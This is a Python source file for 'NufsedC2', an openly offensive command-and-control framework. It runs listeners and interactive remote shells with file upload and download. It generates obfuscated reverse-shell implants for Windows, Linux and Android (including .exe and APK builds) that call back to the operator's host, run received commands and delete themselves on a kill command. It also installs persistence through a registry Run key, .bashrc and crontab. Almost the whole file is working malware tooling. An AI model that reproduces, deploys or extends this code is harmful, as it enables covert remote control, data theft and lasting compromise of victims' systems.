import socket
import threading
import time
import random
import string
import os
import shutil
import base64
import subprocess
import logging
import hashlib
import platform
import sys
from datetime import datetime
from prettytable import PrettyTable
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

class NufsedC2:
    def __init__(self):
        # C2Server-like attributes
        self.primary_port = 5050
        self.host = "0.0.0.0"
        self.unique_ports = set()  # Track assigned ports to avoid duplication
        self.shared_secret = self.load_or_generate_secret()  # Unified secret loading
        self.lock = threading.Lock()  # Ensure thread-safe operations
        self.agent_connections = {}  # Map unique ports to agent details
        self.kill_flag = False

        # nufsedC2-like attributes
        self.targets = []
        self.listener_counter = 0
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host_ip = ""
        self.host_port = 0
        logging.basicConfig(level=logging.INFO, filename='c2_log.log', format='%(asctime)s - %(message)s')
        print(f"{Fore.YELLOW}[!] Current shared secret for this session: {self.shared_secret}{Style.RESET_ALL}")

    def load_or_generate_secret(self, filename='shared_secret.txt'):
        """Load the shared secret from a file if it exists, otherwise generate a new one and save it."""
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                secret = f.read().strip()
            if secret:
                return secret
        # Generate a new secret if none exists
        secret = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        with open(filename, 'w') as f:
            f.write(secret)
        print(f"[+] New shared secret generated: {secret}")
        return secret

    def start_primary_listener(self):
        """Start the primary listener for initial agent connections."""
        primary_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        primary_sock.bind((self.host, self.primary_port))
        primary_sock.listen()
        print(f"\n[+] Listening for initial agent connections on {self.host}:{self.primary_port}\n{Fore.BLUE}Command#> {Style.RESET_ALL}")

        while True:
            try:
                client, addr = primary_sock.accept()
                print(f"[+] Connection received from {addr} on primary port.")
                threading.Thread(target=self.handle_initial_connection, args=(client, addr)).start()
            except Exception as e:
                print(f"[-] Error in primary listener: {e}")

    def handle_initial_connection(self, client, addr):
        """Handle an agent's initial connection and assign a unique port."""
        try:
            # Authenticate agent
            client.send(b"REQUEST_SECRET")
            agent_secret = base64.b64decode(client.recv(1024)).decode('utf-8')

            if agent_secret != self.shared_secret:
                print(f"{Fore.RED}[-] Authentication failed for {addr}.{Style.RESET_ALL}")
                client.send(base64.b64encode(b"UNAUTHORIZED"))
                client.close()
                return

            client.send(base64.b64encode(b"AUTHORIZED"))
            print(f"[+] Authentication successful for {addr}.")

            # Assign unique port
            unique_port = self.get_unique_port()
            print(f"[+] Assigning unique port {unique_port} to {addr}")
            client.send(str(unique_port).encode('utf-8'))

            # Start listener on the unique port
            threading.Thread(target=self.start_unique_listener, args=(unique_port, addr)).start()
        except Exception as e:
            print(f"[-] Error handling initial connection from {addr}: {e}")
        finally:
            client.close()

    def start_unique_listener(self, unique_port, addr):
        """Start a unique listener for the assigned agent."""
        try:
            unique_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            unique_sock.bind((self.host, unique_port))
            unique_sock.listen(1)
            print(f"\n[+] Listening on unique port {unique_port} for agent {addr}\n")

            client, agent_addr = unique_sock.accept()
            print(f"\n[+] Agent reconnected on unique port {unique_port} from {agent_addr}")

            # Register the connection
            with self.lock:
                self.agent_connections[unique_port] = {
                    "addr": agent_addr,
                    "status": "Active",
                    "connected_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }

            # Handle commands
            self.handle_agent_connection(client, agent_addr, unique_port)
        except Exception as e:
            print(f"[-] Error with unique listener on port {unique_port}: {e}")
        finally:
            # Cleanup
            with self.lock:
                if unique_port in self.agent_connections:
                    del self.agent_connections[unique_port]
                self.unique_ports.discard(unique_port)

    def handle_agent_connection(self, client, addr, port):
        """Handle commands and communication with the agent."""
        try:
            while not self.kill_flag:
                command = input(f"Agent {addr} (Port {port})#> ").strip()
                if command.lower() == "exit":
                    client.send(command.encode())
                    client.close()
                    print(f"[+] Connection with agent {addr} on port {port} closed.")
                    break
                else:
                    client.send(command.encode())
                    response = client.recv(4096).decode('utf-8')
                    print(f"Agent {addr} Response:\n{response}")
        except Exception as e:
            print(f"[-] Error communicating with agent {addr} on port {port}: {e}")
        finally:
            with self.lock:
                if port in self.agent_connections:
                    del self.agent_connections[port]

    def get_unique_port(self):
        """Generate and track a unique port for each agent."""
        while True:
            port = random.randint(20000, 30000)
            with self.lock:
                if port not in self.unique_ports:
                    self.unique_ports.add(port)
                    return port

    def list_agents(self):
        """List all connected agents."""
        table = PrettyTable()
        table.field_names = ["Port", "Address", "Status", "Connected At"]
        with self.lock:
            for port, details in self.agent_connections.items():
                table.add_row([
                    port,
                    details["addr"],
                    details["status"],
                    details["connected_at"]
                ])
        print(f"{Fore.CYAN}{table}{Style.RESET_ALL}")

    # Chaos Key Methods
    def generate_chaotic_keys(self, length, r, x0):
        """Generate chaotic keys using the logistic map."""
        x = x0
        chaotic_keys = []
        for _ in range(length):
            x = r * x * (1 - x)
            chaotic_value = int(x * 255)
            while chaotic_value == 0:
                x = r * x * (1 - x)
                chaotic_value = int(x * 255)
            chaotic_keys.append(chaotic_value)
        return chaotic_keys

    def get_hour_block_parameters(self, secret, tolerance=1):
        """Generate chaotic parameters based on the current hour and a shared secret."""
        current_hour = int(time.time() // 3600)  # Current hour as a block
        parameters = []
        for offset in range(-tolerance, tolerance + 1):
            combined = f"{secret}{current_hour + offset}"
            hash_value = hashlib.sha256(combined.encode()).hexdigest()
            x0 = int(hash_value[:8], 16) / 0xFFFFFFFF
            r = 3.99 + (int(hash_value[8:12], 16) % 1000) / 100000
            parameters.append((r, x0))
        return parameters

    def encrypt(self, data, keys):
        """Encrypt or decrypt data using XOR with chaotic keys."""
        return bytearray([data[i] ^ keys[i % len(keys)] for i in range(len(data))])

    @staticmethod
    def clear_screen():
        if os.name == 'nt':  # For Windows
            os.system('cls')
        else:  # For Linux, macOS, and other POSIX systems
            os.system('clear')

    def banner(self):
        print(f"{Fore.CYAN}NufSed C2{Style.RESET_ALL}")
        print(f"""{Fore.MAGENTA}
                                                    .                                   
                                          ~BG7^^?~..                            
                                        7GB&B7?YJ?!^.^:....                     
                                       P&BB&#PPPJ?JY7J^.......                  
                                     .#&#####GPG5!!J5Y:....^~....               
                                    .B&&#####GGBP7!?PJ:^^. .7J:....             
                                    B&&&####BBGBGPYJJ?~7!. .7P7......           
.                                  5&#&&####BBGGGGP5?7?Y!. ^5PJ:..:::.          
....                              !&###&&####BGGGGGG5JJJ7^:JY??:..:..::         
.....                            :&#BB#&&&#&##BGPGGPY?!~::..       .:::^        
........                        .B&BPG##&&#&&##B5!:.                .:.::       
.......                         P&&BPPB###&&&B!.                       .::       
........                       Y##&BPPB#G##5:                           .!:      
.............                 ^&#&&B5G##BY.                             .~Y      
.................             G&&&&GG##Y: ...                          .:!Y      
...................          ~&&&&###J.  .!YPBBG5YJ7!~:......          .^??      
...................         .#&&&&&5.   .^?PB#&&&&&&#GY?7???:         .:!J:      
:.............              :&&&&&7      ^JPG#&&&&&&&B?!77?^          .~!.       
:.........                  .B&&&J        !7 Y#?J#BB#BJ!!!:           :^         
........             ..:~!J??G&&#.        :~ ?&7 P :&P..:.           ..          
:......      .:^~~!77YJY?PY?5PB&G       .~:  ^P7 5 ?@?  :.                      
:.....   :!YYGJ5Y?J?757J?57Y5PYBB    ....?P?^^7: PGB&. :.                       
....  .!GYYPGPJY~7J?JY!J5J~5PP55PY     .~JG#G?~7P#5^5. :.                       
...  !#&#J?7GP!5:~?J57?JG?^YP5P5?PY^:.   ~?5GBGJ5BB5PP!.                        
..  ~&&&JP57YG^Y::7YY7YYG~^YPYG5!55PYY!!~^::^7P#B5J77~:    ..                   
.. :#&#&~Y5J5G~J^.~YYJ5YG^~J5YG5~5YPBJ5YP555J. ^^.        .:^      ..            
. .G&##&7^P7YP?Y^.:JY555G:!Y5YGY~YYYBP!Y?Y5PG^:.  ...      .! ..   ..  .  ..     
. 7&&#B&5.GY7!75~..?555PP.7YYYG?^JY?PB7~Y7?YY^.~.:^:^..   ..: .:    ^. :   .     
 .####G&B.PGY^.Y~..!YPPG5.7YYYG7^JY7JPB~^Y7~7!:^.7^!~^:   ..J: ..   :^ ..        
 ?&G#&B##^J#G7.J^..~Y5PBY ?5Y5G!~JJ?77#P::J?:?.7~:7J!~^   ..Y~ ..    ~. :        
:##PB&###7!&BY~J^..^J5P#J 7555P~!JJ?7!B#J..7~~~^?.Y?777.   .!^ ...   :: .   .    
G&B5P#&##5^#&5!Y:..^?5P#J !P5P5!????Y7Y#G!  ^~?.7:5J???:    :.   .    ^... ..    
&&GY5G###G~5&~~G^..^?5G#J ~PPPY7????P?7GBY:  :7:~:55J?J^    .^....    .. . ..    
&#GY5PB##B?!#^!B^..^75G#? ^PGPJ7JJJ?PJ!PB5!.  .!.~:55YJ7.    :7.7!!?7:.    .     
&#PJYPGB#B5~G~7B~..^75G#? :5GP7~JYYJPJ!YBP?~. .!.~:55YJ7.    :7.7!!?7:.    .     
              {Style.RESET_ALL}""")

    def validate_port(self, port):
        try:
            port = int(port)
            if 1 <= port <= 65535:
                return port
            else:
                raise ValueError("Port out of range")
        except ValueError as e:
            print(f"{Fore.RED}Invalid port: {e}{Style.RESET_ALL}")
            return None

    def start_listener(self, ip, port, protocol="tcp"):
        try:
            if protocol == "udp":
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            else:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            self.sock.bind((ip, port))
            if protocol == "tcp":
                self.sock.listen()
            print(f"{Fore.GREEN}[+] Listening on {ip}:{port} using {protocol.upper()} protocol{Style.RESET_ALL}")
            threading.Thread(target=self.comm_handler, args=(protocol,), daemon=True).start()
        except Exception as e:
            logging.error(f"Error starting listener: {e}")
            print(f"{Fore.RED}Error starting listener: {e}{Style.RESET_ALL}")

    def comm_handler(self, protocol):
        while not self.kill_flag:
            try:
                if protocol == "tcp":
                    client, addr = self.sock.accept()
                    # Expect the client to send the shared secret for auth
                    try:
                        auth_message = base64.b64decode(client.recv(1024)).decode('utf-8')
                        if auth_message != self.shared_secret:
                            client.send(base64.b64encode("UNAUTHORIZED".encode('utf-8')))
                            client.close()
                            print(f"{Fore.RED}[-] Unauthorized connection attempt from {addr}.{Style.RESET_ALL}")
                            continue
                        client.send(base64.b64encode("AUTHORIZED".encode('utf-8')))
                        print(f"{Fore.GREEN}[+] Authorized connection from {addr}.{Style.RESET_ALL}")
                    except Exception as e:
                        # Handle legacy implants that may not send authentication data
                        print(f"{Fore.YELLOW}[!] Legacy implant detected from {addr}.{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[!] Error during authentication: {e}{Style.RESET_ALL}")
                        target_type = "Legacy Implant"
                else:  # UDP
                    data, addr = self.sock.recvfrom(4096)
                    client = None

                target_type = self.detect_shell_type(client, data if protocol == "udp" else None)

                with self.lock:
                    self.targets.append({
                        "socket": client,
                        "addr": addr,
                        "status": "Active",
                        "type": target_type,
                        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "protocol": protocol.upper()
                    })

                print(f"{Fore.GREEN}[+] Connection received from {addr} ({target_type}, {protocol.upper()}){Style.RESET_ALL}")
                logging.info(f"Connection received from {addr} ({target_type}, {protocol.upper()})")
            except Exception as e:
                logging.error(f"Error in comm_handler: {e}")

    def detect_shell_type(self, client, udp_data=None):
        try:
            if udp_data:
                return "Unknown (UDP)"
            if client is None:
                return "Unknown"
            client.settimeout(3)
            test_message = client.recv(1024).decode("utf-8").lower()
            if "powershell" in test_message:
                return "PowerShell"
            elif test_message.startswith("/bin/"):
                return "Unix Shell"
            else:
                return "Unknown"
        except Exception:
            return "Unknown"

    def list_sessions(self):
        myTable = PrettyTable()
        myTable.field_names = ["Session", "Status", "Type", "Address", "Check-In Time", "Protocol"]
        with self.lock:
            for idx, target in enumerate(self.targets):
                target_type = f"{Fore.RED}Legacy Implant{Style.RESET_ALL}" if target["type"] == "Legacy Implant" else target["type"]
                myTable.add_row([idx, target['status'], target_type, target['addr'], target['time'], target['protocol']])
        print(f"{Fore.CYAN}{myTable}{Style.RESET_ALL}")

    def interact_session(self, session_id):
        try:
            with self.lock:
                target = self.targets[session_id]

            if target["status"] != "Active":
                print(f"{Fore.RED}[-] You cannot interact with a dead session.{Style.RESET_ALL}")
                return

            client = target["socket"]
            while True:
                command = input(f"{Fore.YELLOW}Session {session_id} ({target['type']})#> {Style.RESET_ALL}")
                if command.lower() == "exit":
                    self.send_command(client, "exit")
                    client.close()
                    with self.lock:
                        target["status"] = "Dead"
                    break
                elif command.lower() == "background":
                    print(f"{Fore.GREEN}[+] Backgrounding session.{Style.RESET_ALL}")
                    break
                elif command.lower().startswith("download"):
                    filename = command.split(" ", 1)[1]
                    self.receive_file(client, filename)
                elif command.lower().startswith("upload"):
                    filename = command.split(" ", 1)[1]
                    self.send_file(client, filename)
                elif command.lower() == "persist":
                    self.add_persistence(target)
                else:
                    self.send_command(client, command)
                    response = self.receive_response(client)
                    print(response)
        except (IndexError, ValueError):
            print(f"{Fore.RED}[-] Session {session_id} does not exist.{Style.RESET_ALL}")

    def add_persistence(self, target):
        try:
            if "Windows" in target["type"]:
                payload_name = input("[+] Enter the payload name to persist: ")
                persist_command = (
                    f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d {payload_name}"
                )
                self.send_command(target["socket"], persist_command)
                print(f"{Fore.GREEN}[+] Persistence added to Windows target.{Style.RESET_ALL}")
            elif "ANDROID_ROOT" in os.environ:
                payload_name = input("[+] Enter the payload name to persist: ")
                persist_command = f"echo 'python /data/data/com.termux/files/home/{payload_name} &' >> ~/.bashrc"
                self.send_command(target["socket"], persist_command)
                print(f"{Fore.GREEN}[+] Persistence added to Android target.{Style.RESET_ALL}")
            else:
                payload_name = input("[+] Enter the payload name to persist: ")
                persist_command = f"echo '*/1 * * * * python3 /path/to/{payload_name}' | crontab -"
                self.send_command(target["socket"], persist_command)
                print(f"{Fore.GREEN}[+] Persistence added to Linux target.{Style.RESET_ALL}")
        except Exception as e:
            logging.error(f"Error adding persistence: {e}")

    # Communications
    def send_command(self, client, command):
        """Encrypt and send a command using Chaos Keys."""
        r, x0 = self.get_hour_block_parameters(self.shared_secret)[0]
        keys = self.generate_chaotic_keys(len(command), r, x0)
        encrypted_command = self.encrypt(command.encode("utf-8"), keys)
        client.send(base64.b64encode(encrypted_command))

    def receive_response(self, client):
        """Receive and decrypt response from an implant."""
        try:
            encrypted_response = base64.b64decode(client.recv(4096))
            r, x0 = self.get_hour_block_parameters(self.shared_secret)[0]
            keys = self.generate_chaotic_keys(len(encrypted_response), r, x0)
            decrypted_response = self.encrypt(encrypted_response, keys)
            return decrypted_response.decode("utf-8")
        except Exception as e:
            logging.error(f"Error receiving response: {e}")
            return f"{Fore.RED}Error receiving response.{Style.RESET_ALL}"

    def send_file(self, client, filename):
        try:
            if os.path.exists(filename):
                with open(filename, "rb") as f:
                    file_data = base64.b64encode(f.read())
                client.send(file_data)
                print(f"{Fore.GREEN}[+] File {filename} sent successfully.{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] File {filename} does not exist.{Style.RESET_ALL}")
        except Exception as e:
            logging.error(f"Error sending file: {e}")

    def receive_file(self, client, filename):
        try:
            file_data = client.recv(8192)
            file_data = base64.b64decode(file_data)
            with open(filename, "wb") as f:
                f.write(file_data)
            print(f"{Fore.GREEN}[+] File {filename} received successfully.{Style.RESET_ALL}")
        except Exception as e:
            logging.error(f"Error receiving file: {e}")

    def kill_all_implants(self):
        print(f"{Fore.YELLOW}[!] Killing all implants...{Style.RESET_ALL}")
        for target in self.targets:
            if target["status"] == "Active":
                try:
                    self.send_command(target["socket"], "exit")
                    target["socket"].close()
                    target["status"] = "Dead"
                    print(f"{Fore.GREEN}[+] Killed implant at {target['addr']}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[-] Failed to kill implant at {target['addr']}: {e}{Style.RESET_ALL}")

    def generate_payload(self, os_type, protocol="tcp", output_format="py"):
        payload_template = self.build_implant(os_type)
        ran_name = "".join(random.choices(string.ascii_lowercase, k=6))
        payload_name = f"{ran_name}.{output_format}"
        try:
            if output_format == "py":
                with open(payload_name, 'w') as f:
                    f.write(payload_template)
            elif output_format == "exe":
                py_file = f"{ran_name}.py"
                with open(py_file, 'w') as f:
                    f.write(payload_template)
                subprocess.call(["pyinstaller", "--onefile", "--noconsole", py_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                shutil.move(f"dist/{ran_name}.exe", payload_name)
                shutil.rmtree("build")
                os.remove(f"{ran_name}.spec")
                os.remove(py_file)
            elif output_format == "sh":
                with open(payload_name, 'w') as f:
                    f.write(f"#!/bin/bash\n{payload_template}")
                os.chmod(payload_name, 0o755)

            if output_format == "py":
                self.obfuscate_payload(payload_name)

            print(f"{Fore.GREEN}[+] Payload saved as {payload_name}{Style.RESET_ALL}")
        except Exception as e:
            logging.error(f"Error generating payload: {e}")
            print(f"{Fore.RED}[-] Error generating payload: {e}{Style.RESET_ALL}")

    def build_implant(self, os_type):
        """Build an implant with Chaos Key encrypted communication and self-deletion capabilities."""
        implant = f"""
import socket
import base64
import os
import time
import subprocess
import hashlib
import sys

def generate_chaotic_keys(length, r, x0):
    x = x0
    chaotic_keys = []
    for _ in range(length):
        x = r * x * (1 - x)
        chaotic_value = int(x * 255)
        while chaotic_value == 0:
            x = r * x * (1 - x)
            chaotic_value = int(x * 255)
        chaotic_keys.append(chaotic_value)
    return chaotic_keys

def get_hour_block_parameters(secret, tolerance=1):
    current_hour = int(time.time() // 3600)
    parameters = []
    for offset in range(-tolerance, tolerance + 1):
        combined = f"{{secret}}{{current_hour + offset}}"
        hash_value = hashlib.sha256(combined.encode()).hexdigest()
        x0 = int(hash_value[:8], 16) / 0xFFFFFFFF
        r = 3.99 + (int(hash_value[8:12], 16) % 1000) / 100000
        parameters.append((r, x0))
    return parameters

def encrypt(data, keys):
    return bytearray([data[i] ^ keys[i % len(keys)] for i in range(len(data))])

def delete_self():
    try:
        file_path = os.path.abspath(__file__)
        if os.name != 'nt':
            try:
                subprocess.Popen(f"rm -f '{{file_path}}'", shell=True)
                sys.exit(0)
            except Exception as e:
                print(f"Error deleting file on Linux/MacOS: {{e}}")
        else:
            batch_file = f"{{file_path}}.bat"
            try:
                with open(batch_file, 'w') as f:
                    f.write(f"@echo off\n:loop\ndel \"{{file_path}}\" >nul 2>&1\nif exist \"{{file_path}}\" goto loop\ndel \"%~f0\" >nul 2>&1\n")
                subprocess.Popen(batch_file, shell=True)
                sys.exit(0)
            except Exception as e:
                print(f"Error creating or executing batch file on Windows: {{e}}")
    except Exception as e:
        print(f"Error during self-deletion: {{e}}")

def connect():
    shared_secret = "{self.shared_secret}"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('INPUT_IP_HERE', INPUT_PORT_HERE))
            s.send(base64.b64encode(shared_secret.encode('utf-8')))
            auth_response = base64.b64decode(s.recv(1024)).decode('utf-8')
            if auth_response != "AUTHORIZED":
                s.close()
                time.sleep(10)
                continue

            while True:
                encrypted_command = base64.b64decode(s.recv(1024))
                r, x0 = get_hour_block_parameters(shared_secret)[0]
                keys = generate_chaotic_keys(len(encrypted_command), r, x0)
                command = encrypt(encrypted_command, keys).decode("utf-8")

                if command.lower() == "exit":
                    s.close()
                    break
                elif command.lower() == "kill":
                    delete_self()
                elif command.lower().startswith("cd"):
                    try:
                        os.chdir(command.split(" ", 1)[1])
                        response = os.getcwd()
                    except Exception as e:
                        response = f"Error: {{str(e)}}"
                else:
                    response = subprocess.getoutput(command)

                r, x0 = get_hour_block_parameters(shared_secret)[0]
                keys = generate_chaotic_keys(len(response), r, x0)
                encrypted_response = encrypt(response.encode("utf-8"), keys)
                s.send(base64.b64encode(encrypted_response))
        except Exception:
            time.sleep(10)

connect()
"""
        implant = implant.replace("INPUT_IP_HERE", self.host_ip)
        implant = implant.replace("INPUT_PORT_HERE", str(self.host_port))
        return implant

    def obfuscate_payload(self, payload_name):
        try:
            with open(payload_name, 'r') as f:
                content = f.read()
            obfuscated_content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
            with open(payload_name, 'w') as f:
                f.write(f"import base64\nexec(base64.b64decode('{obfuscated_content}').decode('utf-8'))")
            print(f"{Fore.GREEN}[+] Payload obfuscated.{Style.RESET_ALL}")
        except Exception as e:
            logging.error(f"Error obfuscating payload: {e}")

    def generate_android_implant(self, output_format="py"):
        """Generate an Android implant."""
        implant_code = self.build_implant("Android")
        ran_name = "".join(random.choices(string.ascii_lowercase, k=6))
        payload_name = f"{ran_name}.{output_format}"

        try:
            if output_format == "py":
                with open(payload_name, 'w') as f:
                    f.write(implant_code)
            elif output_format == "sh":
                with open(payload_name, 'w') as f:
                    f.write(f"#!/bin/bash\n{implant_code}")
                os.chmod(payload_name, 0o755)

            print(f"{Fore.GREEN}[+] Android payload saved as {payload_name}{Style.RESET_ALL}")
        except Exception as e:
            logging.error(f"Error generating Android implant: {e}")
            print(f"{Fore.RED}[-] Error generating Android implant: {e}{Style.RESET_ALL}")

    def generate_android_apk(self):
    # Check if running on Linux
        if platform.system().lower() != "linux":
            print(f"{Fore.RED}[-] APK generation is only supported when running on Linux.{Style.RESET_ALL}")
            return

        if shutil.which("buildozer") is None:
            print(f"{Fore.RED}[-] Buildozer is not installed. Please install it before generating APKs.{Style.RESET_ALL}")
            return

        implant_code = self.build_implant("Android")
        project_dir = os.path.join(os.getcwd(), "android_implant")
        os.makedirs(project_dir, exist_ok=True)

        # Write the implant code to main.py
        main_py_path = os.path.join(project_dir, "main.py")
        with open(main_py_path, "w") as f:
            f.write(implant_code)

        # Create a Buildozer spec file
        spec_file_path = os.path.join(project_dir, "buildozer.spec")
        with open(spec_file_path, "w") as f:
            f.write(f"""
[app]
title = Android Implant
package.name = androidimplant
package.domain = com.example
source.dir = .
source.include_exts = py
version = 0.1
requirements = python3
orientation = portrait
android.permissions = INTERNET, ACCESS_NETWORK_STATE

[buildozer]
log_level = 2
android.api = 29
android.minapi = 21
""")

        current_dir = os.getcwd()
        try:
            os.chdir(project_dir)
            subprocess.run(["buildozer", "android", "debug"], check=True)
            apk_path = os.path.join(project_dir, "bin", "androidimplant-0.1-debug.apk")
            if os.path.exists(apk_path):
                print(f"{Fore.GREEN}[+] APK generated: {apk_path}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] APK generation failed.{Style.RESET_ALL}")
        except Exception as e:
            logging.error(f"Error generating APK: {e}")
            print(f"{Fore.RED}[-] Error generating APK: {e}{Style.RESET_ALL}")
        finally:
            os.chdir(current_dir)

    def help_menu(self, page_size=30):
        """Display a comprehensive help menu with pagination."""
        help_content = [
            f"{Fore.CYAN}Welcome to nufsedC2! Here are the available commands and features:{Style.RESET_ALL}\n",
            f"{Fore.YELLOW}General Commands:{Style.RESET_ALL}",
            f"  help                     - Show this help menu.",
            f"  exit                     - Exit nufsedC2 gracefully.",
            f"                             Optionally kill all implants before exiting.",
            f"",
            f"{Fore.YELLOW}Listener Commands:{Style.RESET_ALL}",
            f"  listeners -g             - Generate a new listener.",
            f"                             Prompts for IP, port, and protocol (TCP/UDP).",
            f"  sessions -l              - List all active sessions with details.",
            f"  sessions -i <n>          - Interact with session <n>.",
            f"",
            f"{Fore.YELLOW}Session Management Commands:{Style.RESET_ALL}",
            f"  background               - Background the current session.",
            f"  persist                  - Add persistence to the current session.",
            f"  kill                     - Kill all connected implants.",
            f"  upload <file>            - Upload a file to the connected target.",
            f"  download <file>          - Download a file from the connected target.",
            f"",
            f"{Fore.YELLOW}Payload Generation Commands:{Style.RESET_ALL}",
            f"  winplant py              - Generate a Windows-compatible Python payload.",
            f"  winplant exe             - Generate a Windows-compatible executable payload.",
            f"  linplant py              - Generate a Linux-compatible Python payload.",
            f"  linplant sh              - Generate a Linux-compatible shell script payload.",
            f"  androidplant py          - Generate an Android-compatible Python payload.",
            f"  androidplant sh          - Generate an Android-compatible shell script payload.",
            f"  androidplant apk         - Generate an Android-compatible APK implant.",
            f"                             Requires Buildozer and Android SDK/NDK setup.",
            f"",
            f"{Fore.YELLOW}Self-Deletion Functionality:{Style.RESET_ALL}",
            f"  Implants can delete themselves upon receiving a 'kill' command:",
            f"  - Windows: Uses a batch script to remove itself securely.",
            f"  - Linux/Android: Removes the file using shell commands.",
            f"",
            f"{Fore.YELLOW}Chaos Key Encoding Explanation:{Style.RESET_ALL}",
            f"  nufsedC2 employs Chaos Key encoding for secure communication:",
            f"  - Chaotic keys are generated using a logistic map function, producing pseudo-random encryption keys.",
            f"  - A shared secret and the current hour are combined to create time-sensitive keys.",
            f"  - Commands and responses are XOR-encrypted with these keys, ensuring confidentiality.",
            f"",
            f"{Fore.YELLOW}Usage Tips:{Style.RESET_ALL}",
            f"  - Use 'listeners -g' to create a listener before generating implants.",
            f"  - Interact with a session using 'sessions -i <n>'.",
            f"  - Always test your payloads in a controlled environment.",
            f"  - Keep your shared secret secure; it's critical for Chaos Encoding.",
            f"",
            f"{Fore.GREEN}Happy hacking responsibly!{Style.RESET_ALL}"
        ]

        total_lines = len(help_content)
        start = 0

        while start < total_lines:
            self.clear_screen()
            print(f"{Fore.CYAN}--- nufsedC2 Help Menu (Page {start // page_size + 1}/{-(-total_lines // page_size)}) ---{Style.RESET_ALL}\n")
            print("\n".join(help_content[start:start + page_size]))
            start += page_size

            if start < total_lines:
                input(f"\n{Fore.YELLOW}Press Enter to view the next page...{Style.RESET_ALL}")

    def main_loop(self):
        # Start the primary listener in the background
        # This prevents multiple starts if already started, but let's leave it for demonstration.
        # If you need to prevent multiple starts, add a condition.
        #threading.Thread(target=self.start_primary_listener, daemon=True).start()
        while True:
            try:
                

                command = input(f"{Fore.BLUE}Command#> {Style.RESET_ALL}").strip()
                if command == "help":
                    self.help_menu()
                elif command == "listeners -g":
                    self.host_ip = input(f"{Fore.YELLOW}[+] Enter the IP to listen on: {Style.RESET_ALL}")
                    port = input(f"{Fore.YELLOW}[+] Enter the port to listen on: {Style.RESET_ALL}")
                    protocol = input(f"{Fore.YELLOW}[+] Enter protocol (tcp/udp): {Style.RESET_ALL}").lower()
                    self.host_port = self.validate_port(port)
                    if self.host_port and protocol in ["tcp", "udp"]:
                        self.start_listener(self.host_ip, self.host_port, protocol)
                        self.listener_counter += 1
                elif command.startswith("sessions"):
                    args = command.split()
                    if len(args) == 2 and args[1] == "-l":
                        self.list_sessions()
                    elif len(args) == 3 and args[1] == "-i":
                        self.interact_session(int(args[2]))
                #elif command == "list":
                #    self.list_agents()
                #elif command == "multiplayer":
                #    self.start_primary_listener()
                elif command == "kill":
                    self.kill_all_implants()
                elif command.startswith("winplant") and self.listener_counter > 0:
                    output_format = "exe" if "exe" in command else "py"
                    self.generate_payload("Windows", output_format=output_format)
                elif command.startswith("linplant") and self.listener_counter > 0:
                    output_format = "sh" if "sh" in command else "py"
                    self.generate_payload("Linux", output_format=output_format)
                elif command.startswith("androidplant apk") and self.listener_counter > 0:
                    self.generate_android_apk()
                elif command.startswith("androidplant") and self.listener_counter > 0:
                    output_format = "sh" if "sh" in command else "py"
                    self.generate_android_implant(output_format=output_format)
                elif command == "exit":
                    print(f"{Fore.GREEN}[+] Exiting nufsedC2.{Style.RESET_ALL}")
                    break
                else:
                    print(f"{Fore.RED}[-] Invalid command. Type 'help' for options.{Style.RESET_ALL}")
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}[!] Keyboard interrupt detected. Exiting.{Style.RESET_ALL}")
                self.kill_all_implants()
                break
            except Exception as e:
                logging.error(f"Error in main loop: {e}")


if __name__ == "__main__":
    c2 = NufsedC2()
    NufsedC2.clear_screen()
    c2.banner()
    time.sleep(5)
    c2.main_loop()
